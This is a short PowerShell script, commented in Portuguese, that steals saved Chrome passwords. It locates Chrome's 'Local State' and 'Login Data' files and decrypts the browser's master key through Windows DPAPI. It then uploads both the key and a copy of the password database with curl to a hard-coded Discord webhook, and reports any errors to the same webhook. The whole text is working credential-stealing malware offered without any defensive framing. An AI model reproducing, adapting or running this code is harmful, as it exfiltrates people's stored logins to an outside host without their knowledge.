$u = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9"
Add-Type -AssemblyName System.Security

# 1. Função para procurar o arquivo em todos os perfis possíveis
function Find-ChromeFile($fileName) {
    $basePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    $found = Get-ChildItem -Path $basePath -Recurse -Filter $fileName -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($found) { return $found.FullName }
    return $null
}

try {
    # 2. Localiza os arquivos dinamicamente
    $ls = Find-ChromeFile "Local State"
    $ld = Find-ChromeFile "Login Data"

    if (!$ls -or !$ld) {
        curl.exe -F "content=ERRO:Arquivos_nao_encontrados_no_PC" $u
        return
    }

    # 3. Extrai a Chave
    $j = Get-Content $ls -Raw | ConvertFrom-Json
    $e = [Convert]::FromBase64String($j.os_crypt.encrypted_key)[5..255]
    $m = [System.Security.Cryptography.ProtectedData]::Unprotect($e, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    $k = [Convert]::ToBase64String($m)
    
    # Envia a Chave
    curl.exe -F "content=CHAVE:$k" $u

    # 4. Envia o Banco
    $t = "$env:TEMP\L.db"
    Copy-Item $ld $t -Force
    curl.exe -F "file=@$t" $u

} catch {
    # Se der erro, manda o nome do erro sem espaços para o curl não bugar
    $msg = $_.Exception.Message -replace '\s','_'
    curl.exe -F "content=ERRO_FINAL:$msg" $u
}
